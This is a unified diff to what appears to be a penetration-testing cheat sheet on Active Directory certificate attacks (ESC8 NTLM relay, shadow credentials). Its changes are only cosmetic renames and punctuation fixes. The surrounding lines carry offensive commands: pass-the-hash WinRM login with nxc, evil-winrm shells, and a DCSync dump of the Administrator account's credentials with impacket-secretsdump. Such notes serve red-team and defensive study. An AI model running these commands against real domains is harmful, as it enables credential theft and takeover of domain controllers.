@@ -22,7 +22,7 @@
 | **Shadow Credentials** | Abusing `msDS-KeyCredentialLink` attribute to add a public key to a user account               |
 | **PFX / PKCS#12**      | Certificate file format containing both public cert + private key                              |
 
-## ESC8 – NTLM Relay to AD CS Web Enrollment
+## ESC8 - NTLM Relay to AD CS Web Enrollment
 
 > _Goal: Relay authentication -> get a certificate for a machine account (e.g., DC01$)_
 
@@ -100,18 +100,18 @@ evil-winrm -i $TARGET -r $DOMAIN
 ```bash [nxc]
 nxc winrm $DC_IP -k --use-kcache
 # or
-nxc winrm $DC_IP -u $USER -H $HASH
+nxc winrm $DC_IP -u $USER -H $NT_HASH
 ```
 
 :::
 
-### 4. After TGT Obtained – Lateral Movement
+### 4. After TGT Obtained - Lateral Movement
 
 ```bash
 export KRB5CCNAME=/path/to/ticket.ccache
 
 # DCSync (if machine account)
-impacket-secretsdump -k -no-pass -dc-ip $DC_IP -just-dc-user Administrator $DOMAIN/$MACHINE_ACCOUNT$@$DC_HOSTNAME
+impacket-secretsdump -k -no-pass -dc-ip $DC_IP -just-dc-user Administrator $DOMAIN/$MACHINE_ACCOUNT$@$DC_HOST
 
 # WinRM
 evil-winrm -i $TARGET -r $DOMAIN
